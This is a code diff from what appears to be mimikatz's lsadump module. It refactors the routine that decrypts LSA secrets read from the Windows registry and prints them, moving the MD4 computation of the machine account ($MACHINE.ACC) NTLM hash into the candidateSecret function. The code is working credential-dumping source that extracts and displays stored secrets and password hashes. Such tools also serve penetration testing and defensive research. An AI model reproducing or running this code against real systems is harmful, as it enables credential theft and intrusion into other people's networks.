@@ -481,7 +481,6 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 	HKEY hSecrets, hSecret, hValue, hCurrentControlSet, hServiceBase;
 	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
 	PVOID pSecret;
-	MD4_CTX ctx;
 	wchar_t * secretName;
 
 	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets", 0, KEY_READ, &hSecrets))
@@ -511,15 +510,7 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 									{
 										if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
 										{
-											if(_wcsicmp(secretName, L"$MACHINE.ACC") == 0)
-											{
-												kprintf(L"\n**NTLM**: ");
-												MD4Init(&ctx);
-												MD4Update(&ctx, pSecret, szSecret);
-												MD4Final(&ctx);
-												kull_m_string_wprintf_hex(ctx.digest, MD4_DIGEST_LENGTH, 0);
-											}
-											kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/");
+											kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/", secretName);
 											LocalFree(pSecret);
 										}
 										kull_m_registry_RegCloseKey(hSecurity, hValue);
@@ -528,7 +519,7 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 									{
 										if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
 										{
-											kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/");
+											kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/", secretName);
 											LocalFree(pSecret);
 										}
 										kull_m_registry_RegCloseKey(hSecurity, hValue);
@@ -754,13 +745,23 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 	return status;
 }
 
-void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix)
+void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName)
 {
 	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
 	BOOL isStringOk = FALSE;
+	MD4_CTX ctx;
 	if(szBytesSecrets)
 	{
 		kprintf(L"%s", prefix);
+		if(_wcsicmp(secretName, L"$MACHINE.ACC") == 0)
+		{
+			kprintf(L"NTLM:");
+			MD4Init(&ctx);
+			MD4Update(&ctx, bufferSecret, szBytesSecrets);
+			MD4Final(&ctx);
+			kull_m_string_wprintf_hex(ctx.digest, MD4_DIGEST_LENGTH, 0);
+			kprintf(L"/");
+		}
 		if(szBytesSecrets <= USHRT_MAX)
 			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString))
 				kprintf(L"text: %wZ", &candidateString);
